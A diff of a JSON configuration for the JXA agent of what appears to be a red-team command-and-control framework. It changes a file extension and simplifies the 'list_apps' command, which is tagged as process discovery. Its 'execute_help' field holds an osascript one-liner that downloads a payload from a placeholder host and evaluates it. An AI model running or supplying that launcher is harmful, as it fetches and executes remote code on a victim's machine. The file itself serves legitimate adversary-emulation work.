@@ -6,7 +6,7 @@
     "supported_os":"macOS (x64)",
     "execute_help":"osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('http:\/\/domain.com\/payload.file')),$.NSUTF8StringEncoding)));\"\n    ",
     "ptype":"apfell-jxa",
-    "file_extension":".js",
+    "file_extension":"js",
     "wrapped_payload_type":"null",
     "external": false,
     "files":[],
@@ -195,30 +195,18 @@
     },
     {
       "needs_admin":false,
-      "help_cmd":"list_apps with optional {\"method\": api, \"verbose\": false}",
+      "help_cmd":"list_apps",
       "version":1,
-      "description":"This uses JXA to list the currently running processes on the system and provides some information about them. To get a lot of information, use the [verbose] optional parameter.",
+      "description":"This uses NSApplication.RunningApplications api to get information about running applications.",
       "cmd":"list_apps",
       "parameters":[
-      {
-      "type":"Choice",
-      "hint":"",
-      "choices":"api\njxa",
-      "required":false,
-      "name":"method"
-      },
-      {
-      "type":"Boolean",
-      "hint":"",
-      "choices":"",
-      "required":false,
-      "name":"verbose"
-      }
       ],
       "attack":[
         {"t_num": "T1057", "attack_name": "Process Discovery"}
       ],
-      "artifacts": []
+      "artifacts": [],
+      "is_process_list": true,
+      "process_list_parameters": ""
     },
     {
       "needs_admin":false,
